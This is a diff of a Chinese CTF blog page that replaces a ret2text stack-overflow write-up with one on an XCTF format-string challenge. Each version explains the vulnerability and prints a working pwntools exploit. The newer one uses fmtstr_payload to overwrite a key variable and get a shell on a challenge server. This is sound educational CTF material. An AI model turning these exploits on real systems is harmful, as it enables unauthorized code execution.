@@ -4,27 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ret2text, 微凉">
-    <meta name="description" content="
-首先checksec
+    <meta name="keywords" content="实时数据检测, 微凉">
+    <meta name="description" content="checksec
 
-运行
+ida
 
-拖入IDA
+​        只要令key的值为35795746便可以getshell
 
-发现危险函数
+达到任意地址写的核心在于提供如下格式化字符串: printf(“%s%n”,str,&amp;amp;num)
 
-
-
-
-发现system和bin/sh
-
-
-
-找到s相对于ebp的距离0x6c+4
-
-编写exp
-from pwn import *                       ">
+如何修改num的值为很大?">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -36,7 +25,7 @@ from pwn import *                       ">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ret2text | 微凉</title>
+    <title>实时数据检测 | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -223,12 +212,12 @@ from pwn import *                       ">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ret2text</h1>
+                    <h1 class="description center-align post-title">实时数据检测</h1>
                 </div>
             </div>
         </div>
@@ -344,8 +333,12 @@ from pwn import *                       ">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                <span class="chip bg-color">栈溢出</span>
+                            <a href="/tags/xctf/">
+                                <span class="chip bg-color">xctf</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                <span class="chip bg-color">格式化字符串</span>
                             </a>
                         
                     </div>
@@ -369,7 +362,7 @@ from pwn import *                       ">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-10
+                    2022-01-14
                 </div>
                 
 
@@ -378,7 +371,7 @@ from pwn import *                       ">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    81
+                    481
                 </div>
                 
 
@@ -403,42 +396,49 @@ from pwn import *                       ">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ul>
-<li><p>首先checksec</p>
-<img src="/2022/01/10/ret2text/checksec.png" alt="image-20220110191034015" style="zoom:80%;"></li>
-<li><p>运行</p>
-<img src="/2022/01/10/ret2text/run.png" alt="image-20220110191210204" style="zoom:80%;"></li>
-<li><p>拖入IDA</p>
+                <h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/14/data/checksec.png" alt="image-20220114192523091" style="zoom:80%;">
+
+<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/14/data/main.png" alt="image-20220114192624436" style="zoom:80%;">
+
+<p>​        只要令key的值为35795746便可以getshell</p>
 <ul>
-<li><p>发现危险函数</p>
-<img src="/2022/01/10/ret2text/function.png" alt="image-20220110191317331" style="zoom:80%;"></li>
-</ul>
+<li><p><strong>达到任意地址写的核心在于提供如下格式化字符串: printf(“%s%n”,str,&amp;num)</strong></p>
 </li>
-<li><ul>
-<li><p>发现system和bin/sh</p>
-<img src="/2022/01/10/ret2text/system.png" alt="image-20220110191459039" style="zoom:80%;"></li>
-</ul>
+<li><p>如何修改num的值为很大?</p>
+<p>写入num的值为printf打印出来的所有字符总和,但是如何在内存中构建很大的字符串呢?还要恰好满足长度合适.其实这里可以用格式化控制的输出,printf(“%08x”,num)的含义为十六进制打印,打印时不满8位的补齐8位.</p>
 </li>
-<li><p>找到s相对于ebp的距离0x6c+4</p>
-<img src="/2022/01/10/ret2text/s.png" alt="image-20220110194447617" style="zoom: 50%;"></li>
-<li><p>编写exp</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *                                                           
-  2 log_level = 'debug'
-  3 local = 1
-  4 if local:
-  5     r = process("./ret2text")
-  6 else:
-  7     r = remote("")
-  8 elf = ELF("./ret2text")
-  9  
- 10 s = 0x6c + 4
- 11 system_addr = 0x0804863A
- 12  
- 13 payload = b'a'*s+p32(system_addr)
- 14 r.sendline(payload)
- 15  
- 16 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>如何将num的地址传入</p>
+<p>在调用printf之前,父函数的栈上即为输入的字符串s,调用printf时,是将s的地址作为第一个参数传入,由于printf并不知道自己有几个参数,完全取决于格式化字符串的格式化控制,并且在printf的栈的ebp上即为父函数的栈空间,其中就能找到字符串s,因此可以将num的地址写在s中,在printf(“%吗$n”)的语法中,m为具体数值,表示第几个参数作为num的地址,并写入打印出的字符个数.</p>
+</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+log_level = 'debug'
+elf = ELF("./data")
+local = 0
+
+if local:
+    r = process("./data")
+else:
+    r = remote("111.200.241.244",50260)
+
+key_addr = 0x0804A048
+key_value = 0x2223322
+
+#payload =flat(["%12$n",p32(key_addr),p32(key_value)])
+payload = fmtstr_payload(12,{key_addr:key_value})
+r.sendline(payload)
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li><p><strong>fmtstr_payload函数</strong></p>
+<p><em>class</em> pwnlib.fmtstr.AtomWrite(<em>start</em>, <em>size</em>, <em>integer</em>, <em>mask=None</em>)[<a target="_blank" rel="noopener" href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L161-L279">source]</a></p>
+<p>This class represents a write action that can be carried out by a single format string specifier.</p>
+<p>Each write has an address (start), a size and the integer that should be written.</p>
+<p>Additionally writes can have a mask to specify which bits are important. While the write always overwrites all bytes in the range [start, start+size) the mask sometimes allows more efficient execution. For example, assume the current format string counter is at 0xaabb and a write with with integer = 0xaa00 and mask = 0xff00 needs to be executed. In that case, since the lower byte is not covered by the mask, the write can be directly executed with a %hn sequence (so we will write 0xaabb, but that is ok because the mask only requires the upper byte to be correctly written).</p>
+</li>
 </ul>
 
                 
@@ -466,7 +466,7 @@ from pwn import *                       ">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/01/10/ret2text/">https://breeze-666.github.io/2022/01/10/ret2text/</a>
+                    <a href="https://breeze-666.github.io/2022/01/14/data/">https://breeze-666.github.io/2022/01/14/data/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -504,8 +504,12 @@ from pwn import *                       ">
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
-                                    <span class="chip bg-color">栈溢出</span>
+                                <a href="/tags/xctf/">
+                                    <span class="chip bg-color">xctf</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                                    <span class="chip bg-color">格式化字符串</span>
                                 </a>
                             
                         </div>
@@ -551,17 +555,18 @@ from pwn import *                       ">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/10/ret2shellcode/">
+                <a href="/2022/01/14/data/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="ret2shellcode">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="实时数据检测">
                         
-                        <span class="card-title">ret2shellcode</span>
+                        <span class="card-title">实时数据检测</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -571,9 +576,63 @@ from pwn import *                       ">
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                        <span class="chip bg-color">格式化字符串</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/01/14/tnt/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="反应釜开关控制">
+                        
+                        <span class="card-title">反应釜开关控制</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -593,57 +652,8 @@ from pwn import *                       ">
                         <span class="chip bg-color">栈溢出</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/01/10/defcon-2015-r0pbaby/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="Defcon-2015-r0pbaby">
-                        
-                        <span class="card-title">Defcon-2015-r0pbaby</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-10
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
-                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">
-                        <span class="chip bg-color">二进制</span>
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
                     </a>
                     
                 </div>
